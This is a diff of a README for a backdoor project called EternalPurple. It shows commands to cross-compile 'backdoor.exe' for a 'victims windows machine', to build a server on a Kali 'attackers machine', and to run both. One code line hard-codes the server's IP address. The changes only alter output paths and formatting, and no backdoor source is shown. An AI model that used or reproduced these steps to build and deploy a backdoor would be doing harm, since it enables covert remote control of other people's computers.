@@ -15,14 +15,13 @@ server_address.sin_addr.s_addr = inet_addr("192.168.174.129");//Server address
 ```
 -> **Compile client for victims windows machine:**
 ```sh
-i686-w64-mingw32-gcc -o /Documents/EternalPurple/bin/client/backdoor.exe /Documents/EternalPurple/backdoor.c -lwsock32 -lwininet
+i686-w64-mingw32-gcc -o /Documents/EternalPurple/backdoor.exe /Documents/EternalPurple/backdoor.c -lwsock32 -lwininet
 ```
-
 ->**Compile server for linux attackers machine:**
 ```sh
-gcc /home/kali/Documents/EternalPurple/server.c -o /home/kali/Documents/EternalPurple/bin/server/server.exe
+gcc /home/kali/Documents/EternalPurple/server.c -o /home/kali/Documents/EternalPurple/server.exe
 ```
--> **Execute**
+->**Execute**
 ```sh
 ./server.exe
 backdoor.exe
